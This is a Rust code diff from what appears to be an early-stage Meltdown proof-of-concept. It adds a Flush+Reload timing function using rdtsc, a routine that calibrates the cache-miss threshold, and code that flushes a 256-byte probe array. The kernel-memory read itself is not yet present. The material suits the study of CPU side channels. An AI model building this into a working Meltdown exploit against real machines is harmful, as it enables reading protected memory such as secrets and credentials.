@@ -40,11 +40,24 @@ pub fn flush(pointer: *const usize) {
     }
 }
 
+pub fn flush_reload(pointer: *const usize, cache_miss_threshold: u64) -> bool {
+    let start_time: u64;
+    let end_time: u64;
+    
+    start_time = rdtsc();
+    maccess(pointer);
+    end_time = rdtsc();
+    
+    flush(pointer); // The entry is probably cached now no matter whether it was cached before, flush it so we don't expell the entry we are looking for from the cache by caching all other entries
+    
+    end_time - start_time < cache_miss_threshold
+}
+
 pub fn detect_flush_reload_threshold() -> u64{
     let mut reload_time: u64 = 0;
     let mut flush_reload_time: u64 = 0;
     let count: u64 = 10000000;
-    let dummy: usize = 0; // Use single value instead of array ok?
+    let dummy: usize = 0; // TODO Use single value instead of array ok?
     let pointer: *const usize;
     let mut start_time: u64;
     let mut end_time: u64;
@@ -79,7 +92,14 @@ pub fn detect_flush_reload_threshold() -> u64{
 #[unsafe(no_mangle)]
 pub fn main() {
     println!("Meltdown start\n");
+    const array_size: usize = 256;
     
     println!("Current CPU time: {}", rdtsc());
-    detect_flush_reload_threshold();
+    let cache_miss_threshold = detect_flush_reload_threshold();
+    
+    let mem: [u8; array_size] = [0; array_size];
+    
+    for i in 0..array_size {
+        flush(&mem[i] as *const usize);
+    }
 }
